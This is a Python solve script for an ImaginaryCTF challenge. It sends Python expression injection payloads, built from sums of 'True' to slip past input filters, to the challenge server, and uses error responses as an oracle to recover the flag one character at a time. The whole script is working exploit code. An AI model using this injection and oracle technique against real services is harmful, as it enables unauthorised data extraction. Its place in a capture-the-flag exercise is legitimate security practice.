import socket
import time

def connect_to_server():
    for _ in range(5):
        try:
            return socket.create_connection(("ok-nice.chal.imaginaryctf.org", 1337))
        except socket.error:
            time.sleep(5)
    raise ConnectionError("Failed to connect to the server after multiple attempts")

def send_receive(sock, message):
    buffer = ""
    while True:
        try:
            data = sock.recv(1024).decode()
            buffer += data
            
            if "Enter input:" in buffer:

                sock.sendall((message + "\n").encode())
                
                buffer = ""
                data = sock.recv(1024).decode()
                buffer += data
                
                return buffer.strip()
        except socket.error:
            sock.close()
            sock = connect_to_server()
            buffer = "" 

def find_flag_length():
    length = 2
    while True:
        try:
            sock = connect_to_server()
            payload = f"flag[{'+'.join(['True']*length)}]"
            response = send_receive(sock, payload)
            print(response)
            if "error" in response.lower():
                sock.close()
                return length
            length += 1
        except ConnectionError:
            print(f"Connection error while finding flag length. Retrying from length {length}")
        finally:
            try:
                sock.close()
            except:
                pass

def decode_flag(length):
    flag = ""
    for i in range(17,length):
        for ascii_val in range(127,32,-1): 
            try:
                sock = connect_to_server()
                payload = f"[flag][ord(flag[{'+'.join(['True']*i)}])-({'+'.join(['True']*ascii_val)})]"
                response = send_receive(sock, payload)
                print(response,'tried',ascii_val)
                if "error" not in response.lower():
                    flag += chr(ascii_val-1)
                    print(f"Decoded character {i+1}/{length}: {chr(ascii_val-1)}")
                    break
            except ConnectionError:
                print(f"Connection error while decoding character {i+1}. Retrying.")
                ascii_val -= 1 
            finally:
                try:
                    sock.close()
                except:
                    pass
        else:
            print(f"Failed to decode character {i+1}")
            flag += "?"
    return flag

def main():
    try:
        print("Finding flag length...")
        flag_length = find_flag_length()
        print(f"Flag length: {flag_length}")

        print("Decoding flag...")
        flag = decode_flag(24)
        print(f"Decoded flag: {flag}")
    except KeyboardInterrupt:
        print("\nScript interrupted. You can restart it to continue from where it left off.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()

